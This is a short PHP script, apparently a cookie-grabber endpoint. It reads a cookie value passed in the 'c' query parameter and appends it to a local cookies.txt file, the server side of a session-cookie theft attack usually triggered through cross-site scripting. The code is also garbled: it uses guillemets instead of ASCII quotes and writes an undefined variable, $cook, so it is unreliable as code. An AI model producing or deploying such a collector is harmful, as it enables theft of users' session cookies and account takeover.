<?php
$cookie = $_GET[«c»]; 
if($cookie){

$fp = fopen(«cookies.txt»,»a»); 

fputs($fp,$cook . «\r\n»);  
fclose($fp); 
}?>
